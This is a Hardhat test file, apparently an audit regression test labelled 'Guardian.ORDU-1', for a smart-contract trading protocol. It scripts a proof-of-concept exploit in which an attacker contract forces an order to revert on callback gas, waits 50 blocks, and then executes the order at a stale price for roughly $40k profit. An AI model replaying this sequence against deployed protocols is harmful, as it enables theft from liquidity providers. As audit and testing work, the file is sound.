import { expect } from "chai";

import { deployFixture } from "../../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../../utils/math";
import { getPoolAmount, getSwapImpactPoolAmount, getMarketTokenPrice } from "../../../utils/market";
import { handleDeposit, getDepositCount } from "../../../utils/deposit";
import { OrderType, getOrderCount, getOrderKeys, createOrder, executeOrder, handleOrder } from "../../../utils/order";
import { getPositionCount, getAccountPositionCount, getPositionKeys } from "../../../utils/position";
import { mine, time } from "@nomicfoundation/hardhat-network-helpers";

describe("Guardian.ORDU-1", () => {
  const { provider } = ethers;

  let fixture;
  let user0, user1, user2, user3;
  let reader,
    dataStore,
    oracle,
    depositVault,
    ethUsdMarket,
    ethUsdSpotOnlyMarket,
    wnt,
    wbtc,
    usdc,
    attackContract,
    exchangeRouter,
    eventEmitter,
    ethEthMarket,
    solEthEthMarket,
    wbtcEthEthMarket;
  let executionFee;
  beforeEach(async () => {
    fixture = await deployFixture();

    ({ user0, user1, user2, user3 } = fixture.accounts);
    ({
      reader,
      dataStore,
      oracle,
      depositVault,
      ethUsdMarket,
      ethUsdSpotOnlyMarket,
      wnt,
      wbtc,
      usdc,
      attackContract,
      exchangeRouter,
      eventEmitter,
      ethEthMarket,
      solEthEthMarket,
      wbtcEthEthMarket,
    } = fixture.contracts);
    ({ executionFee } = fixture.props);

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(1000 * 5000, 6),
      },
    });
    await handleDeposit(fixture, {
      create: {
        market: ethUsdSpotOnlyMarket,
        longTokenAmount: expandDecimals(10000000, 18),
        shortTokenAmount: expandDecimals(1000000 * 5000, 6),
      },
    });
  });

  it("CRITICAL: Pick up and execute order with non updated price after gas revert", async () => {
    const initialUSDCBalance = expandDecimals(50 * 1000, 6);
    expect(await getOrderCount(dataStore)).eq(0);

    const longSwapPath = [];

    for (let i = 0; i < 63; i++) {
      if (i % 2 == 0) longSwapPath.push(ethUsdMarket.marketToken);
      else longSwapPath.push(ethUsdSpotOnlyMarket.marketToken);
    }

    const params = {
      account: attackContract,
      callbackContract: attackContract,
      callbackGasLimit: 1900000,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: usdc, // Collateral will get swapped to ETH by the swapPath -- 50k/$5k = 10 ETH Collateral
      initialCollateralDeltaAmount: initialUSDCBalance,
      swapPath: longSwapPath,
      sizeDeltaUsd: decimalToFloat(200 * 1000), // 4x leverage -- position size is 40 ETH
      acceptablePrice: expandDecimals(5001, 12),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
      gasUsageLabel: "createOrder",
    };

    // Create a MarketIncrease order that will run out of gas doing callback
    await createOrder(fixture, params);
    expect(await getOrderCount(dataStore)).eq(1);
    expect(await getAccountPositionCount(dataStore, attackContract.address)).eq(0);
    expect(await getPositionCount(dataStore)).eq(0);
    expect(await getAccountPositionCount(dataStore, attackContract.address)).eq(0);

    // executeOrder will run out of gas and revert
    await expect(executeOrder(fixture)).to.be.reverted;

    // attacker wait 50 blocks for price increase
    await mine(50);

    // attack flips switch to reduce callback gas usage
    await attackContract.flipSwitch();

    expect(await getOrderCount(dataStore)).eq(1);

    // executeOrder with original price
    await executeOrder(fixture, {
      minPrices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      maxPrices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
    });

    expect(await getOrderCount(dataStore)).eq(0);
    expect(await getAccountPositionCount(dataStore, attackContract.address)).eq(1);
    expect(await getPositionCount(dataStore)).eq(1);

    await handleOrder(fixture, {
      create: {
        account: attackContract,
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: 0,
        sizeDeltaUsd: decimalToFloat(200 * 1000),
        acceptablePrice: 6001,
        orderType: OrderType.MarketDecrease,
        isLong: true,
        gasUsageLabel: "orderHandler.createOrder",
        swapPath: [ethUsdMarket.marketToken], // Swap earnings from WNT back to USDC
      },
      execute: {
        minPrices: [expandDecimals(6000, 4), expandDecimals(1, 6)],
        maxPrices: [expandDecimals(6000, 4), expandDecimals(1, 6)],
        gasUsageLabel: "orderHandler.executeOrder",
      },
    });

    const postBalanceWNT = await wnt.balanceOf(attackContract.address);
    const postBalanceUSDC = await usdc.balanceOf(attackContract.address);

    // 40 ETH * $1,000 profit/ETH = $40,000 profit
    // 10 ETH Collateral @ $6,000/ETH = $60k
    // Therefore realize $100k upon decreasing
    expect(postBalanceUSDC).to.gt(
      expandDecimals(100 * 1000, 6)
        .mul(999)
        .div(1000)
    );
    expect(postBalanceUSDC).to.lt(
      expandDecimals(100 * 1000, 6)
        .mul(1001)
        .div(1000)
    );
    expect(postBalanceWNT).to.eq(0);
  }).timeout(100000);
});
